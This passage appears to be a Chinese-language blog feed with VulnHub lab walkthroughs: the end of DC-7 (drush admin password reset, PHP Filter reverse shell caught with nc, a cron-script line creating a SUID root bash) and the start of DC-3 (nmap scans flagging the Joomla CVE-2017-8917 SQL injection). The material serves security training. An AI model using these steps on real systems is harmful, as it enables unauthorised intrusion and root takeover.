吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:~$ <span class="hljs-built_in">cat</span> mbox<br><br>From root@dc-7 Thu Aug 29 17:00:22 2019<br>Return-path: &lt;root@dc-7&gt;<br>Envelope-to: root@dc-7<br>Delivery-<span class="hljs-built_in">date</span>: Thu, 29 Aug 2019 17:00:22 +1000<br>Received: from root by dc-7 with <span class="hljs-built_in">local</span> (Exim 4.89)<br>        (envelope-from &lt;root@dc-7&gt;)<br>        <span class="hljs-built_in">id</span> 1i3EPu-0000CV-5C<br>        <span class="hljs-keyword">for</span> root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000<br>From: root@dc-7 (Cron Daemon)<br>To: root@dc-7<br>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=UTF-8<br>Content-Transfer-Encoding: 8bit<br>X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;<br>X-Cron-Env: &lt;SHELL=/bin/sh&gt;<br>X-Cron-Env: &lt;HOME=/root&gt;<br>X-Cron-Env: &lt;LOGNAME=root&gt;<br>Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;<br>Date: Thu, 29 Aug 2019 17:00:22 +1000<br><br>Database dump saved to /home/dc7user/backups/website.sql               [success]<br>gpg: symmetric encryption of <span class="hljs-string">&#x27;/home/dc7user/backups/website.tar.gz&#x27;</span> failed: File exists<br>gpg: symmetric encryption of <span class="hljs-string">&#x27;/home/dc7user/backups/website.sql&#x27;</span> failed: File exists<br></code></pre></td></tr></table></figure><h2 id="定时任务文件"><a href="#定时任务文件" class="headerlink" title="定时任务文件"></a>定时任务文件</h2><p>看起来似乎是邮件提示，里面提到了 <code>/opt/scripts/backups.sh</code> 文件，看一看这个文件的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:~$ <span class="hljs-built_in">cat</span> /opt/scripts/backups.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">rm</span> /home/dc7user/backups/*<br><span class="hljs-built_in">cd</span> /var/www/html/<br>drush sql-dump --result-file=/home/dc7user/backups/website.sql<br><span class="hljs-built_in">cd</span> ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz<br><span class="hljs-built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.sql<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.tar.gz<br><br>dc7user@dc-7:/opt/scripts$ <span class="hljs-built_in">ls</span> -alih<br>total 12K<br>269846 drwxr-xr-x 2 root www-data 4.0K Aug 29  2019 .<br>262385 drwxr-xr-x 3 root root     4.0K Aug 29  2019 ..<br>272756 -rwxrwxr-x 1 root www-data  520 Aug 29  2019 backups.sh<br><br></code></pre></td></tr></table></figure><p>感觉像个定时任务，定期把备份文件，并且把文件用 gpg 工具加密后存放在用户家目录的 backups 目录下。除此之外还有个比较有意思的事情，这个文件的属主是 root，但是却被划归到 www-data组里 ，并且 www-data 的组成员还有对这个文件的修改权限。那接下来考虑考虑如何登录到后台反弹 shell。还有个问题是上述代码里提到了关于 gpg 工具的使用，问问 chatgpt</p><p><img src="/pic/e158c95a2fb31449844473748a720d0f_MD5.png"></p><h2 id="gpg-解密"><a href="#gpg-解密" class="headerlink" title="gpg 解密"></a>gpg 解密</h2><p>那我们可以尝试进行解密，然后拿到 sql 文件，找找其中有没有登录用户的密码</p><p><img src="/pic/02ecfc3e2ee9be21cadc36f7a10fc797_MD5.png"></p><p>使用上述命令解压获得 sql 文件，里面全是 sql 语句，那我们就找找已知的一个用户 <code>dc7user</code>，我这里用 vscode 打开，然后搜索，找到了插入密码的语句，尝试破解，但是这是 drupal 自己的加密算法……john 的 format 中没有这个算法，使用在线工具也没得到答案</p><p><img src="/pic/57bf196cbbaa1c98f1536c7530c9c4b7_MD5.png"></p><p>既然 gpg 命令用上了，那么 drush 命令有什么作用呢</p><p><img src="/pic/98357999e91c53beec6fb6f396893f52_MD5.png"></p><h2 id="drush-用户管理"><a href="#drush-用户管理" class="headerlink" title="drush 用户管理"></a>drush 用户管理</h2><p>可以进行用户管理，那我们可以修改 admin 用户的密码（sql 语句中可以判断出还有个 admin 用户），刚开始直接使用命令产生了报错</p><p><img src="/pic/f770fa4a66d53da68c1046c7543d8b63_MD5.png"></p><p>我们尝试切换到网站目录下，再运行一次命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:/var/www/html$ drush user:password admin --password=<span class="hljs-string">&quot;123456&quot;</span><br>Changed password <span class="hljs-keyword">for</span> admin                                                                               [success]<br></code></pre></td></tr></table></figure><h2 id="drupal后台getshell"><a href="#drupal后台getshell" class="headerlink" title="drupal后台getshell"></a>drupal后台getshell</h2><p>成功更换了密码，登录后台。但是我找了半天都没有找到如何上传或者修改文件来 getshell，我尝试了搜索 <code>drupal upload php</code> <code>drupal upload php file</code> 和 <code>drupal upload php shell</code> ，有个视频点进去<a href="https://www.youtube.com/watch?v=GkPnorkwyEU">How To Upload Shell in Drupal (Easy Way) - YouTube</a></p><p><img src="/pic/425ff94df51eb5ebda0b1c59ad7d47cb_MD5.png"></p><p>需要开启 php filter 模块</p><p><img src="/pic/712d5b5a7d6a33934c22e404a061f01b_MD5.png"></p><p>但我在界面里没找到，看来需要自己手动安装</p><p><img src="/pic/900b8ead9981b603e1e7c3ca02604e8a_MD5.png"></p><p>尝试找找如何下载这个模块，点进第一个链接 <a href="https://www.drupal.org/project/php">PHP | Drupal.org</a></p><p><img src="/pic/07949941f93565f58f3edce13b578dbf_MD5.png"></p><p>在页面最下面找到了下载链接，将其下载到本地然后上传上去</p><p><img src="/pic/b9ad439ebb1f864127848aa4767d74b1_MD5.png"></p><p>安装成功，可能按照视频里那样，将其开启了。选中该模块，下滑拉到页面最下方，选择 install</p><p><img src="/pic/b0386ee4c8561410ffe905f70bd210cd_MD5.png"></p><p>得到界面提示 <code>Module PHP Filter has been enabled. </code></p><p><img src="/pic/65f0dcd8ea718f0316c0d255a107fdf1_MD5.png"></p><p>新建内容</p><p><img src="/pic/8a5f3c55f558587336de9b382851a68a_MD5.png"></p><p>选择类型为 phpcode</p><p><img src="/pic/7981a750cc45d7e1a4eda2c4e600bbfe_MD5.png"></p><p>刚开始传了个最简单 php，一下子就断开了连接。换了个经典 reverseshell</p><p><img src="/pic/6bd47a7b0e41ef5b2827bfde1087049b_MD5.png"></p><p>开启监听后，再点 save，成功反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_7]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.127] 43874<br>Linux dc-7 4.9.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span><br> 23:26:39 up 23 min,  1 user,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>dc7user  pts/0    192.168.56.106   23:16    8:23   0.02s  0.02s -bash<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure><p>完善一下 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@dc-7:/$ <span class="hljs-built_in">cd</span> /opt/scripts<br><span class="hljs-built_in">cd</span> /opt/scripts<br>www-data@dc-7:/opt/scripts$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backups.sh<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>把 sh 文件修改一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-7:/opt/scripts$ <span class="hljs-built_in">cat</span> backups.sh<br><span class="hljs-built_in">cat</span> backups.sh<br><span class="hljs-comment">#!/bin/bash</span><br>www-data@dc-7:/opt/scripts$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash;chmod +xs /tmp/bash&quot;</span> &gt;&gt; backups.sh<br>&lt;n/bash /tmp/bash;<span class="hljs-built_in">chmod</span> +xs /tmp/bash<span class="hljs-string">&quot; &gt;&gt; backups.sh</span><br></code></pre></td></tr></table></figure><p>等了约十分钟左右，在 tmp 中看到了 bash 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:/tmp$ <span class="hljs-built_in">ls</span> -laih<br>total 6.4M<br>   297 drwxrwxrwt  9 root    root    4.0K Jul 11 22:15 .<br>     2 drwxr-xr-x 22 root    root    4.0K Aug 29  2019 ..<br> 19744 -rwxr-xr-x  1 dc7user dc7user  520 Jul 11 18:55 backups.sh.bak<br> 19749 -rwsr-sr-x  1 root    root    1.1M Jul 11 22:15 bash<br>142361 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .font-unix<br>140696 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .ICE-unix<br>142662 drwx------  3 root    root    4.0K Jul 11 18:47 systemd-private-08c188e365d948dfb5100a1d5a8a6631-apache2.service-EHVFfc                                                                                                          <br>142543 drwx------  3 root    root    4.0K Jul 11 18:47 systemd-private-08c188e365d948dfb5100a1d5a8a6631-systemd-timesyncd.service-VQL1CO                                                                                                <br>142541 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .Test-unix<br> 19747 -rw-r--r--  1 dc7user dc7user 5.3M Jul 11 21:18 website.sql<br>131153 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .X11-unix<br>141106 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .XIM-unix<br>dc7user@dc-7:/tmp$ ./bash -p<br>bash-4.4<span class="hljs-comment"># whoami</span><br>root<br>bash-4.4<span class="hljs-comment"># cd /root</span><br>bash-4.4<span class="hljs-comment"># ls</span><br>theflag.txt<br>bash-4.4<span class="hljs-comment"># cat theflag.txt</span><br><br><br><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  <span class="hljs-string">&quot;Y88b                            888 888 888 888 </span><br><span class="hljs-string">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="hljs-string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="hljs-string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="hljs-string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="hljs-string">&quot;   &quot;</span>   <span class="hljs-string">&quot;   &quot;</span>  <br>888P     Y888  <span class="hljs-string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="hljs-string">&quot;Y88P&quot;</span>  888  888  <span class="hljs-string">&quot;Y8888  888 888 888 888 </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span><br><span class="hljs-string">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="hljs-string">challenges.</span><br><span class="hljs-string"></span><br><span class="hljs-string">I&#x27;m sending out an especially big thanks to:</span><br><span class="hljs-string"></span><br><span class="hljs-string">@4nqr34z</span><br><span class="hljs-string">@D4mianWayne</span><br><span class="hljs-string">@0xmzfr</span><br><span class="hljs-string">@theart42</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-3 靶机</title>
    <link href="/2023/07/d3fd0d829200.html"/>
    <url>/2023/07/d3fd0d829200.html</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3-靶机"><a href="#DC-3-靶机" class="headerlink" title="DC-3 靶机"></a>DC-3 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.125<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 10:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00074s latency).                                                                                      <br>Not shown: 65534 closed tcp ports (reset)                                                                           <br>PORT   STATE SERVICE                                                                                                <br>80/tcp open  http                                                                                                   <br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.30 seconds<br></code></pre></td></tr></table></figure><p>TCP 只有一个 80 端口开放</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.168.56.125     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 10:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00057s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Home<br>|_http-generator: Joomla! - Open Source Content Management<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.27 seconds<br></code></pre></td></tr></table></figure><p>使用的是 Joomla, Ubuntu 操作系统。印象中 Joomla 应该有很多漏洞，再看一眼 UDP 扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_3/rsa/2048]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.125     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 22:39 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00061s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.92 seconds<br></code></pre></td></tr></table></figure><p>的确只有这个端口开放着，nmap 漏洞脚本扫描一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80 192.168.56.125     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 10:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00069s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>| http-internal-ip-disclosure: <br>|_  Internal IP Leaked: 127.0.1.1<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-vuln-cve2017-8917: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Joomla! 3.7.0 &#x27;</span>com_fields<span class="hljs-string">&#x27; SQL Injection Vulnerability</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2017-8917</span><br><span class="hljs-string">|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</span><br><span class="hljs-string">|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers</span><br><span class="hljs-string">|       to execute aribitrary SQL commands via unspecified vectors.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2017-05-17</span><br><span class="hljs-string">|     Extra information:</span><br><span class="hljs-string">|       User: root@localhost</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917</span><br><span class="hljs-string">|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.125<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.125:80/<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.125:80/index.php<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=reset&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: user-registration<br>|     Form action: /index.php/component/users/?task=reset.request&amp;Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=reset&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php/component/users/?Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/2-uncategorised/1-welcome<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=remind&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: user-registration<br>|     Form action: /index.php/component/users/?task=remind.remind&amp;Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=remind&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php/component/users/?Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/<br>|     Form <span class="hljs-built_in">id</span>: username-lbl<br>|     Form action: /index.php/component/users/?task=user.login&amp;Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|_    Form action: /index.php/component/users/?Itemid=101<br>| http-enum: <br>|   /administrator/: Possible admin folder<br>|   /administrator/index.php: Possible admin folder<br>|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0<br>|   /language/en-GB/en-GB.xml: Joomla version 3.7.0<br>|   /htaccess.txt: Joomla!<br>|   /README.txt: Interesting, a readme.<br>|   /bin/: Potentially interesting folder<br>|   /cache/: Potentially interesting folder<br>|   /images/: Potentially interesting folder<br>|   /includes/: Potentially interesting folder<br>|   /libraries/: Potentially interesting folder<br>|   /modules/: Potentially interesting folder<br>|   /templates/: Potentially interesting folder<br>|_  /tmp/: Potentially interesting folder<br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 327.57 seconds<br></code></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>提到了 cve2017-8917 漏洞，还给出了许多目录和文件，顺便目录爆破一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.168.56.125  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.125/_23-07-10_10-50-31.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-10_10-50-31.<span 